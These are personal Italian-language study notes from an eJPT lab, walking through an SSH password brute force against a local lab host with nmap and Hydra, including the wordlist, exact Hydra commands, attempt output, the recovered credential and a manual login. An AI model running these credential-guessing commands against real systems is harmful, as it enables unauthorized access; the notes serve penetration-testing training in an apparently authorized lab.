# Brute Force Notes - eJPT Lab

Appunti personali sugli attacchi di brute force controllato nel laboratorio eJPT.

> Tutte le attività sono svolte esclusivamente in ambiente locale autorizzato.

---

## 1. Obiettivo

Allenare un attacco di password brute force controllato contro un servizio SSH del laboratorio.

Questa attività copre l’obiettivo eJPT:

```text
Condurre attacchi con password di forza bruta
```

---

## 2. Target usato

```text
Target: Target3-Ubuntu
IP: 192.168.1.104
Servizio: SSH
Porta: 22
Utente: spywer
```

---

## 3. Verifica servizio SSH

Prima del brute force è stata verificata la porta SSH:

```bash
nmap -sC -sV -p 22 192.168.1.104
```

Risultato:

```text
22/tcp open ssh OpenSSH 10.2p1 Ubuntu
```

Interpretazione:

```text
Il servizio SSH è attivo e raggiungibile.
È possibile testare credenziali SSH in ambiente autorizzato.
```

---

## 4. Creazione wordlist

È stata creata una piccola wordlist controllata:

```bash
nano passwords.txt
```

Esempio contenuto:

```text
admin
password
123456
gerardo123
spywer
password
```

Nota:

```text
La wordlist è volutamente piccola per evitare traffico inutile.
Nel laboratorio era presente la password corretta.
```

---

## 5. Comando Hydra

Comando usato:

```bash
hydra -l spywer -P passwords.txt ssh://192.168.1.104 -t 4 -V
```

---

## 6. Spiegazione opzioni Hydra

```text
-l spywer          username singolo da testare
-P passwords.txt   wordlist password
ssh://IP           servizio SSH da attaccare
-t 4               massimo 4 thread
-V                 mostra ogni tentativo
```

---

## 7. Output importante

Hydra ha provato le password presenti nella wordlist:

```text
[ATTEMPT] target 192.168.1.104 - login "spywer" - pass "admin"
[ATTEMPT] target 192.168.1.104 - login "spywer" - pass "password"
[ATTEMPT] target 192.168.1.104 - login "spywer" - pass "123456"
[ATTEMPT] target 192.168.1.104 - login "spywer" - pass "gerardo123"
```

Risultato positivo:

```text
[22][ssh] host: 192.168.1.104   login: spywer   password: password
1 of 1 target successfully completed, 1 valid password found
```

Interpretazione:

```text
Hydra ha trovato una credenziale valida per SSH.
Username: spywer
Password: password
```

---

## 8. Verifica manuale SSH

Dopo il risultato di Hydra, è stato verificato manualmente l’accesso:

```bash
ssh spywer@192.168.1.104
```

Password usata:

```text
password
```

Accesso riuscito:

```text
Welcome to Ubuntu 26.04 LTS
spywer@target3:~$
```

Interpretazione:

```text
La credenziale trovata da Hydra è valida.
L’accesso SSH è stato confermato manualmente.
```

---

## 9. Catena completa

```text
Nmap identifica SSH aperto
↓
Utente noto: spywer
↓
Creazione wordlist controllata
↓
Hydra contro SSH
↓
Password trovata
↓
Verifica manuale con ssh
↓
Accesso riuscito al target
```

---

## 10. Comandi rapidi

Verifica SSH:

```bash
nmap -sC -sV -p 22 192.168.1.104
```

Creazione wordlist rapida:

```bash
cat > passwords.txt << EOF
admin
password
123456
gerardo123
spywer
EOF
```

Brute force SSH con Hydra:

```bash
hydra -l spywer -P passwords.txt ssh://192.168.1.104 -t 4 -V
```

Verifica accesso:

```bash
ssh spywer@192.168.1.104
```

---

## 11. Errori comuni

### Username errato

Se l’utente non esiste, Hydra può fallire anche con password corretta.

Verificare sempre:

```text
utente valido
servizio attivo
IP corretto
porta corretta
```

---

### Porta SSH diversa

Se SSH non è sulla porta 22, specificare la porta:

```bash
hydra -l USER -P passwords.txt -s PORTA ssh://IP
```

Esempio:

```bash
hydra -l spywer -P passwords.txt -s 2222 ssh://192.168.1.104
```

---

### Wordlist senza password corretta

Se la password non è nella wordlist, Hydra non la troverà.

```text
Il brute force dipende dalla qualità della wordlist.
```

---

## 12. Collegamento con eJPT

Questa esercitazione copre:

```text
Identificare servizio SSH
Usare username noto
Creare una wordlist
Condurre brute force controllato
Verificare credenziali trovate
Accedere al target tramite SSH
```

---

## 13. Lezioni apprese

```text
Prima si identifica il servizio con Nmap.
Hydra va usato in modo controllato.
La wordlist deve contenere candidate password realistiche.
Il risultato di Hydra va sempre verificato manualmente.
Una password debole come "password" viene trovata rapidamente.
```

---

## 14. Nota etica

Questo test è stato svolto esclusivamente su Target3-Ubuntu, macchina del laboratorio personale.

Non usare Hydra o tecniche di brute force contro sistemi reali senza autorizzazione esplicita.
